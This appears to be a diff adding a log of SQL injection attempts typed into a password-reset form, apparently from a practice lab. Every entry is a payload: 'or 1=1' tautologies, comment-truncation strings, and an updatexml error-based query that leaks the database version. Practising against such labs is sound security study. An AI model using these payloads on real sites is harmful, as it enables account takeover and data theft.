@@ -1,0 +1,26 @@
+User Name:'\' or 1=1 -- #'
+New Password:
+User Name:'\" or 1=1 -- #'
+New Password:
+User Name:'1\' and updatexm'
+New Password:
+User Name:''
+New Password:0' -- #
+User Name:''
+New Password:0' where 1 -- #
+User Name:3
+New Password:0' -- #
+User Name:'\' or 1=1 -- #'
+New Password:0' -- #
+User Name:'\' or 1=1 -- #'
+New Password:0' -- #
+User Name:'admin'
+New Password:admin
+User Name:''
+New Password:1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1); -- #
+User Name:''
+New Password:' or 1=1 -- #
+User Name:''
+New Password:'
+User Name:'admin'
+New Password:' or 1=1 -- #
